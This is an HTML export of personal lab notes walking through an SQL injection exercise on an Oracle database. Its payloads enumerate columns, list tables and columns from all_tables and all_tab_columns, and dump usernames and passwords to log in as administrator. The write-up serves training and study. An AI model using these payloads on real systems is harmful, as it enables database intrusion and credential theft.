<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>#10 Lab10</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>#10 Lab10</h1><br/><strong><h3>Lab: SQL injection attack, listing the database contents on Oracle</h3></strong><br /><a name="SQL_INJECTION_ENUMERATING_DB-STRUCTURE_ORACLEdb"></a><br /><br /><br /><a href=""><img src="images/22-1.png" alt="images/22-1.png" /></a><br /><br />we will follow the same approach however this time we also need to consider the database specific syntax for oracle.<br />we will launch the lab<br /><br /><a href=""><img src="images/22-2.png" alt="images/22-2.png" /></a><br /><br /><strong><span style="background-color:#7f7f7f;">â€¢ We will start by probing for number of columns using our script</span></strong><br /><a href=""><img src="images/22-3.png" alt="images/22-3.png" /></a><br /><br />the error is because the script is intended for MYSQL so it does not contain **from** which is neccessary for the Query to work in Oracle...so now that we know we have 2 columns now we will use UNION SELECT to find what gets printed..<br /><br /><strong><span style="background-color:#ff0000;"># Payload1</span></strong><br /><br /><br /><div class="codebox"><div class="codebox"><span style="color:#3ad900;font-weight:400">&#39;&nbsp;UNION&nbsp;SELECT&nbsp;&#39;</span><span style="color:#ff0044;font-weight:400">11</span><span style="color:#3ad900;font-weight:400">&#39;,&nbsp;NULL&nbsp;from&nbsp;dual&nbsp;--</span><br /></div></div><br /><a href=""><img src="images/22-4.png" alt="images/22-4.png" /></a><br /><br /><br />we modify the payload a bit {<span style="color:#ff0000;">this time we try to print both columns as string data type</span>}<br /><div class="codebox"><div class="codebox"><span style="color:#3ad900;font-weight:400">&#39;&nbsp;UNION&nbsp;SELECT&nbsp;&#39;</span><span style="color:#ff0044;font-weight:400">11</span><span style="color:#3ad900;font-weight:400">&#39;,&nbsp;&#39;</span><span style="color:#ff0044;font-weight:400">11</span><span style="color:#3ad900;font-weight:400">&#39;&nbsp;from&nbsp;dual&nbsp;--</span><br /></div></div><br /><br /><a href=""><img src="images/22-5.png" alt="images/22-5.png" /></a><br /><br />and we can see both 11&#39;s get printed  nice.<br /><br /><strong><h3># Listing Tables</h3></strong>  {<span style="color:#ff0000;">oracle</span>}<br /><br /><div class="codebox"><div class="codebox"><span style="color:#3ad900;font-weight:400">&#39;&nbsp;UNION&nbsp;SELECT&nbsp;table_name,&nbsp;NULL&nbsp;from&nbsp;all_tables&nbsp;--</span><br /></div></div><br /><br /><a href=""><img src="images/22-6.png" alt="images/22-6.png" /></a><br /><br />we find a intersting users table and now we need to Find what columns present in there..<br /><br /><div class="codebox"><div class="codebox"><span style="color:#3ad900;font-weight:400">&#39;&nbsp;UNION&nbsp;SELECT&nbsp;column_name,&nbsp;NULL&nbsp;from&nbsp;all_tab_columns&nbsp;WHERE&nbsp;table_name&nbsp;=&nbsp;&#39;</span>USERS_JJVCSB<span style="color:#3ad900;font-weight:400">&#39;&nbsp;--</span><br /></div></div><br /><br /><a href=""><img src="images/22-7.png" alt="images/22-7.png" /></a><br /><br /><br />and now we need to dump creds as we have found the relevant columns<br /><br /><div class="codebox"><div class="codebox"><span style="color:#3ad900;font-weight:400">&#39;&nbsp;UNION&nbsp;SELECT&nbsp;USERNAME_YJOVKS,&nbsp;PASSWORD_CVBDMS&nbsp;from&nbsp;USERS_JJVCSB&nbsp;--</span><br /></div></div><br /><br /><a href=""><img src="images/22-8.png" alt="images/22-8.png" /></a><br /><br />Now that we have the creds we will complete the lab by loggin in with the creds we Find for user admin*<br /><br /><span style="color:#7f7f7f;">username</span>: <span style="color:#ff0000;">administrator</span><br /><span style="color:#7f7f7f;">password</span>: <span style="color:#00ff00;">5tqtd4wdkfcbp2dks2u5</span><br /><a href=""><img src="images/22-9.png" alt="images/22-9.png" /></a><br /></div></body></html>